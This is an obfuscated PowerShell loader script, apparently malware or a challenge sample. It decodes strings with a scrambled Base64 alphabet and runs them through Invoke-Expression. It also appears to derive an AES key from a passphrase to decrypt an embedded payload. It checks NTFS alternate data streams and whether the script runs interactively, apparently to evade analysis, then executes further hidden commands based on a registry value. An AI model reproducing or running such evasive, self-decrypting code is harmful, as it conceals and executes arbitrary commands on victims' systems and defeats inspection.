function Do-B ([Object[]]$inStr="asdasd"){
   $b = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String("QQBCAEMARABFAEYARwBIAEoASQBLAEwATgBNAE8AUABRAFIAUwBUAFUAVgBZAFgAVwBaAGEAYgBjAGQAZQBmAGcAaABqAGkAawBsAG4AbQBvAHAAcQByAHMAdAB1AHYAeQB4AHcAegAxADIAMwA0ADUANgA3ADgAOQAwAC8AKwA="));
   $r = "";
   $p = "";
   $c = $inStr.Length % 3;
   If($c -gt 0 ) {;
      While($c -lt 3){;
         $p += "=";
         $inStr += 0;
         $c += 1;
      };
   };
   ;For($i=0;
         $i -lt $inStr.Length;
         $i+=3){;
      $n0 = [convert]::ToInt32($inStr[$i]);
      $n1 = [convert]::ToInt32($inStr[$i+1]);
      $n2 = [convert]::ToInt32($inStr[$i+2]);
      $n = ($n0 -shl 16) + ($n1 -shl 8) + ($n2);
      $n0 = ($n -shr 18) -band 63;
      $n1 = ($n -shr 12) -band 63;
      $n2 = ($n -shr 6) -band 63;
      $n3 = $n -band 63;
      $r += $b[$n0] + $b[$n1] + $b[$n2] + $b[$n3];
   };
   $r = $r.SubString(0,$r.Length-$p.Length);
   $r = $r + $p;
   Write-Output $r;
   return $r;
}


Function Do-D([String]$inStr){;
   $p = "";
   $b = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String("QQBCAEMARABFAEYARwBIAEoASQBLAEwATgBNAE8AUABRAFIAUwBUAFUAVgBZAFgAVwBaAGEAYgBjAGQAZQBmAGcAaABqAGkAawBsAG4AbQBvAHAAcQByAHMAdAB1AHYAeQB4AHcAegAxADIAMwA0ADUANgA3ADgAOQAwAC8AKwA="));
   $bi = @();
   $r = "";
   For($i = 0;
         $i -lt 256;
         $i++){;
      $bi += -1;
   };
   $enc = [system.Text.Encoding]::ASCII;
   $bb = $enc.GetBytes($b);
   For($i = 0;
         $i -lt $bb.Length;
         $i++){;
      $bi[$bb[$i]] = $i;
   };

   If($inStr[$inStr.Length-1] -eq "="){;
      $p += "A";
   };
   If($inStr[$inStr.Length-2] -eq "="){;
      $p += "A";
   };
   $inStr = $inStr.SubString(0,$inStr.Length - $p.Length) + $p;
   $inBytes = $enc.GetBytes($inStr);
   For($i=0;
         $i -lt $inBytes.Length;
         $i+=4){;
      $n0 = [convert]::ToInt32($inBytes[$i]);
      $n1 = [convert]::ToInt32($inBytes[$i+1]);
      $n2 = [convert]::ToInt32($inBytes[$i+2]);
      $n3 = [convert]::ToInt32($inBytes[$i+3]);
      $n0 = $bi[$inBytes[$i]] -shl 18;
      $n1 = $bi[$inBytes[$i+1]] -shl 12;
      $n2 = $bi[$inBytes[$i+2]] -shl 6;
      $n3 = $bi[$inBytes[$i+3]];
      $n = $n0 + $n1 + $n2 + $n3;
      $n0 = ($n -shr 16) -band 255;
      $n1 = ($n -shr 8) -band 255;
      $n2 = $n -band 255;
      $r += [convert]::ToChar($n0) + [convert]::ToChar($n1) + [convert]::ToChar($n2);
   };
   $r = $r.SubString(0,$r.Length-$p.Length);
      Write-Output $r;
   return $r;
}


function ds($e, $Passphrase, $s="sc", $i="ivp") 
{ 
   if($e -is [string]){ 
      $e = rc "Y1MvbmZlcmRdOipGcn0tQnFzZTW1U4RwaY6mKCRlKSA="
   } 

   $r = rc "bnV4LU0janVidCBTeXM1ZY1uU3VidXIpdHkuQ4I6cHRvZ4IhcGh6LlIpan6kWYVsTYFuWYdlZA==" 
      $pass = [Text.Encoding]::UTF8.GetBytes($Passphrase) 
      $s = [Text.Encoding]::UTF8.GetBytes($s)

      $r.Key = rc "KG6ldw2PWnplW4QgU3VidXIpdHkuQ4I6cHRvZ4IhcGh6LlBhc4M4b4IkRGVwaXZlQml1ZXNgIHBhc4NsJCRzLCAjU1hBNSJsJDUpLkdldEI6dGVzKDNwKQ=="
      $r.IV = rc "KG6ldw2PWnplW4QgU3VidXIpdHkuQ4I6cHRvZ4IhcGh6LlMJQTFMWY6hZ3VkKS6Db32ydXRlSGFzaCggY2RleHQuRY6ib3RpbnddOipVVEW5LkdldEI6dGVzKCRpKSApYzAuLiE2XSA=" 


      $d = rc "IHJuQ4IlWXRlRGVicmlydG0wKCk="
      $ms = rc "bnV4LU0janVidCBITw6MZY2vcmlTdHIlWY1gQCgsIGUpJA=="
      $cs = rc "bnV4LU0janVidCBTZYM2cnl1eS6DcmlydG0mcnFyaHkuQ4I6cHRvU4RwZYFtJCRtcwykZCyjUnVhZCJ="
      $sr = rc "bnV4LU0janVidCBITw6TdHIlWY2SZYFkZXJgIGMz"
      rc "V4IpdGUtT4V1cHV1JCRzcj6SZYFkVG0FbnQoKQ=="
      rc "IHMwLkMsb4MlKCk="
      rc "IGMzLkMsb4MlKCkg"
      rc "IG2zLkMsb4MlKCk="
      rc "IHJuQ3xlWXJoKQ=="
} 

function rc([String]$inStr)
{
   return iex(Do-D($inStr))
}

function pl (){
   $c = $MyInvocation.ScriptName.Length -ne 0
      $c = -Not $c
      return $c
}

function hds
{
   $gp = Do-D "QzpcV3luZG04c2xUZY2yXCo="
      rc "U3V1LVZhcnlhWnxlJC2OWY2lJCImZwJgLVZhbHVlKHIiJCISN2WxTFVMb3FZeGtTYFIsWlMBdFVHRiFhQ1FrYiRBZ3ZDQkhaYFF1U2hSbGITQXRVMFI4YllGdEpDb3cjKSAtU3MvcGUgZ3xvWnFs"

      $g = $false

      foreach($gi in $gg)
      {
         If($gi.Stream -ne ":`$DATA")
         {
            rc "U3V1LVZhcnlhWnxlJC2OWY2lJCIkJjAtVnFsdYUocnNgJlJzViFNVU23Wn2SbGItUYdNVkIoZEdmZ1lHZHBNa2pyWkdYT2dZNnxKQzIUZEhIbFdZNYdIR3RyTGxMNYMuVnhjUT10JjkgLVMib4BlJGdsb3IhbA=="
               rc "U3V1LVZhcnlhWnxlJC2OWY2lJCItJjAtVnFsdYUocnNgJnIuViRNYTBqWY6YaYRDQXRYSGx6YlU3aGIZVYdVMGx7ZEdYdExsTYxXMFZ4WVhSMkxrTXdlYEJxWiMkd2dWQn0lUzZMUkRYRGMtbHlkRzBUYlhIN3FZTYxVSEl3ZG6sa2pWSi1jKSAtU3MvcGUgZ3xvWnFs"
               rc "U3V1LVZhcnlhWnxlJC2OWY2lJCI2dGW5JjAtVnFsdYUocnNgJnIuViRNYTBqWY6YaYRDQXRYSGx6YlU3aGIZVYdVMGx7ZEdYdExsUnxlSFF2VlZSR10FVmVXNzBrWVk3bSJpJC2TW30yZSBmbG0jWYy="
               rc "U3V1LVZhcnlhWnxlJC2OWY2lJCIoJjAtVnFsdYUocnNgJlkwTTZiMFIsWlN3Q3FWUkRjNzWzYlhINVpWSYRPaXBVWiIMNYMubHVad3drWlN3RGJzNmlkYFIsU1dGenFDZ3tkYFIuT1N3SFpWUkMlYFIsW4dma2pDa4BLUT10JjkgLVMib4BlJGdsb3IhbA=="

               If($h -eq $gi.Stream)
               {
                  $g = $true
               }
         }
      }

   return $g
}

$g = (hds) -and (pl)	

If($g)
{
   $t = Do-D "QzpcV3luZG04c2xzeXM1ZY1zNlxzb3Z1d3FwZVVyZGF1ZS6yczE="

      rc "U3V1LVZhcnlhWnxlJC2OWY2lJCIhJjAtVnFsdYUocnNgJlJzViFNVYyxYlkwUYMuNHlaYEkxZVMBdFVHRiFhQ1IvWTM5dE0seHpjN2oxZDMGd2pYeHRhYU24WiRMdlptUnMkN3x2YkcyMGNweGlkYEl4Ylk3NYRuVmdiN3x3Wnx5d3RZMnMVNzBuZEhkaGMuVlZiR2IoZEdVPSJpJC2TW30yZSBmbG0jWYy="
      $a = $a.'(default)'
      If($a -eq $t)
      {
         rc "U3V1LVZhcnlhWnxlJC2OWY2lJCItJjAtVnFsdYUocnNgJnIuViRNYTBqWY6YaYRDQXRYSGx6YlU3aGIZVYdVMGx7ZEdYdExsTYxXMFZ4WVhSMkxrTXdlYEJxWiMkd2dWQn0lUzZMUkRYRGMtbHlkRzBUYlhIN3FZTYxVSEl3ZG6sa2pWSi1jKSAtU3MvcGUgZ3xvWnFs"
            rc "U3V1LVZhcnlhWnxlJC2OWY2lJCI2JjAtVnFsdYUocnNgJnIuViRNYTBqWY6YaYRDQXRYSGx6YlU3aGIZVYdVMGx7ZEdYdExsUnxlSFF2VlZSR10FVmVXNzBrWVk3bSJpJC2TW30yZSBmbG0jWYy="
            rc "U3V1LVZhcnlhWnxlJC2OWY2lJCIoJjAtVnFsdYUocnNgJlkwTTZiMFIsWlN3Q3FWUkRjNzWzYlhINVpWSYRPaXBVWiIMNYMubHVad3drWlN3RGJzNmlkYFIsU1dGenFDZ3tkUzZJYlhSQ3VWUnxid3drV2MrcEtRPT1jKSAtU3MvcGUgZ3xvWnFs"
            rc "U3V1LVZhcnlhWnxlJC2OWY2lJCIkWXRhJjAtVnFsdYUgKCIrb1lhcTBoMXA5bEh1dY2RZU22MihRPT1jKSAtU3MvcGUgZ3xvWnFs"
            rc "U3V1LVZhcnlhWnxlJC2OWY2lJCIyWXI1NSJgLVZhbHVlJChkcwAkZGF1WSAkaCkgLVMib4BlJGdsb3IhbA=="
            rc "IHBhcmQxPSRkZYN="
      }
}

function doencode([String]$s)
{
   $enc = [System.Text.Encoding]::UTF8
      $b = $enc.GetBytes($s)
      $e = Do-B $b
      $e
}